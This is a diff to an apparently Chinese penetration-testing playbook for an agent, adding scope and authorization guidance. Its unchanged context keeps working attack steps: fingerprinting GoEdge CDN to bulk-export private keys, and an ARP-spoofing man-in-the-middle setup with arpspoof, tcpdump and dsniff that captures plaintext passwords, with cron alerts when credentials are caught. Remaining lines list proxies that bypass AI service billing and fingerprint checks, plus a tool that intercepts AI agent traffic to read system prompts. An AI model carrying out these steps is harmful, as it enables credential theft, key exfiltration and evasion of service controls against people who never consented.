@@ -8,6 +8,37 @@ metadata:
 
 ## 专题实战利用（全内联）
 
+## 适用场景
+
+适合当前目标已经出现与某个专题高度匹配的产品、版本、入口或架构信号，需要参考已有实战路径验证。
+
+## 核心判断
+
+先确认专题匹配信号、目标版本、影响范围和最小验证动作，再选择对应 playbook。每个专题都是候选路径，不是默认任务清单。
+
+## 证据标准
+
+- 专题匹配需要产品指纹、版本、入口或架构证据。
+- 凭据、证书、私钥和对象访问需要实际响应和归属确认。
+- 持久化、ARP MITM、S3 写入等高风险动作可记录影响与回滚条件。
+- 只有公开案例或工具名称时保持候选。
+
+## 决策树
+
+- 发现明确产品指纹：选择对应 playbook 做最小验证。
+- 版本不匹配：保留线索，不直接套用 CVE。
+- 涉及中间人和凭据：确认网络范围和数据处理边界。
+- 涉及持久化或源站写入：停止并请求明确授权。
+- 得到影响证据：写回并停止扩展。
+
+## 常见误判
+
+- 看到工具或端口就认定目标可利用。
+- 直接复用公开实例的 AK/SK 或私钥。
+- 把专题步骤全部执行当成完成审计。
+- 忽略业务归属和法律边界。
+- 高风险操作没有回滚方案。
+
 ### GoEdge CDN(8002端口)私钥批量导出
 ```
 指纹: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → 要X-Cloud-Access-Token
@@ -38,7 +69,7 @@ metadata:
   修复: ip neigh replace 目标IP lladdr 目标MAC dev eth0 nud permanent (网关同样预填) → 跳过libnet解析,arpspoof即正常
 部署: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof×4双向(目标↔网关各一进程) | tcpdump -w x.pcap -s0 -C100 -W10 host 目标
   dsniff -i eth0 -w /tmp/dsniff.log (专抓SSH/FTP/HTTP明文密码)
-持久化: crontab '*/2 * * * * /root/mitm_chk.sh'补位 + rc.local开机自启
+可选保持：crontab 或 rc.local 等动作可先评估影响、审计和回滚条件
 验证: pgrep -c arpspoof==4 | tcpdump -r x.pcap看是否截获目标流量
 事件通知: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (有鱼才通知:脚本检测dsniff日志新内容→stdout输出→投递,无新内容静默)
 清理: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | crontab去mitm行 | ip neigh del 各条 | rm pcap/log
@@ -95,7 +126,6 @@ init3接口: POST /web/<appkey>/<channel>/init3 → 返回URL-safe base64编码�
 ### AI IDE API反代/key泄露目录(发现并评估AI编程工具反代方案)
 ```
 背景: Cursor Web免费API 2026-04起只剩gemini-3-flash,Claude全砍 → 拿Claude 4.6+需其他渠道
-可用方案: freemodel-cc-proxy(免费,FreeModel真Claude,伪装Claude Code指纹绕403,Opus4.8/Sonnet4.6) | WindsurfAPI(dwgx,Windsurf gRPC转API,100+模型,账号池轮询)
   askalf/dario(Claude Pro/Max订阅转API,绕headless计费) | bypass/chatgpt-adapter(xllm-go,多家逆向接口聚合转OpenAI格式)
 已废: cursor2api/cursor2api-go(只剩gemini-3-flash) | 辅助: claude-tap(MITM拦AI Agent真实流量研究system prompt/工具调用)
 GitHub搜索法: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → 过滤desc → /repos/<o>/<r>/readme(base64解码读) → /search/issues查最新状态
